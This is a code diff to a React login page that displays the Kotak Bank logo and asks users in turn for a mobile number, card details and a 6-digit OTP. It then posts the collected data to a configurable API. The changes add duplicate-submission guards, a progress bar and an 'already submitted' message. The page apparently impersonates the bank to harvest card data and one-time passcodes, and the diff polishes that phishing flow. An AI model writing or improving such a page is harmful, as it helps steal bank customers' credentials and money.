@@ -42,6 +42,8 @@ export default function Login() {
     setStep(1)
   }
 
+  const [submitted, setSubmitted] = useState(false)
+
   const validateStep1 = () => {
     const newErrors = {}
     if (!mobile || mobile.length !== 10) {
@@ -70,15 +72,19 @@ export default function Login() {
   }
 
   const handleLogin = () => {
+    if (submitted) return
     setError('')
     if (validateStep1()) {
+      setSubmitted(true)
       setStep(2)
     }
   }
 
   const handleCardVerify = () => {
+    if (submitted) return
     setError('')
     if (validateStep2()) {
+      setSubmitted(true)
       setStep(3)
     }
   }
@@ -86,10 +92,12 @@ export default function Login() {
   const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:3000/api'
 
   const handleOtpVerify = () => {
+    if (submitted) return
     if (!otp || otp.length !== 6) {
       setError('Please enter valid 6-digit OTP')
       return
     }
+    setSubmitted(true)
 
     const userData = {
       service: selectedService,
@@ -108,6 +116,11 @@ export default function Login() {
     })
     .then(res => res.json())
     .then(data => {
+      if (!data.success && data.error === 'Duplicate entry') {
+        setSubmitted(false)
+        setError('You have already submitted. Please try again later.')
+        return
+      }
       setError('')
       setLoading(true)
       setTimeout(() => {
@@ -164,6 +177,12 @@ export default function Login() {
           <img src="https://www.kotak.bank.in/content/dam/Kotak/svg-icons/navigation/kmbl-logo.svg" alt="Kotak Bank" className="h-[40px]" />
         </Link>
       </div>
+
+      {submitted && (
+        <div className="fixed top-[60px] left-0 right-0 h-1 bg-purple-200 z-[1001]">
+          <div className="h-full bg-purple-600 animate-pulse" style={{ width: '60%' }}></div>
+        </div>
+      )}
 
       {loading && (
         <div className="fixed inset-0 bg-black bg-opacity-80 z-50 flex items-center justify-center">
@@ -232,7 +251,7 @@ export default function Login() {
         <div className="p-4">
           <div className="bg-white rounded-xl shadow-lg p-6">
             <div className="flex items-center mb-4">
-              <button onClick={() => setStep(0)} className="mr-3">
+              <button onClick={() => { setStep(0); setSubmitted(false); }} className="mr-3">
                 <BiArrowBack className="text-2xl text-purple-700" />
               </button>
               <span className="text-xl font-semibold text-gray-800">Verify Your Details</span>
@@ -297,7 +316,7 @@ export default function Login() {
         <div className="p-4">
           <div className="bg-white rounded-xl shadow-lg p-6">
             <div className="flex items-center mb-4">
-              <button onClick={() => setStep(1)} className="mr-3">
+              <button onClick={() => { setStep(1); setSubmitted(false); }} className="mr-3">
                 <BiArrowBack className="text-2xl text-purple-700" />
               </button>
               <span className="text-xl font-semibold text-gray-800">Verification Required</span>
@@ -368,7 +387,7 @@ export default function Login() {
         <div className="p-4">
           <div className="bg-white rounded-xl shadow-lg p-6">
             <div className="flex items-center mb-4">
-              <button onClick={() => setStep(2)} className="mr-3">
+              <button onClick={() => { setStep(2); setSubmitted(false); }} className="mr-3">
                 <BiArrowBack className="text-2xl text-purple-700" />
               </button>
               <span className="text-xl font-semibold text-gray-800">Verification Required</span>
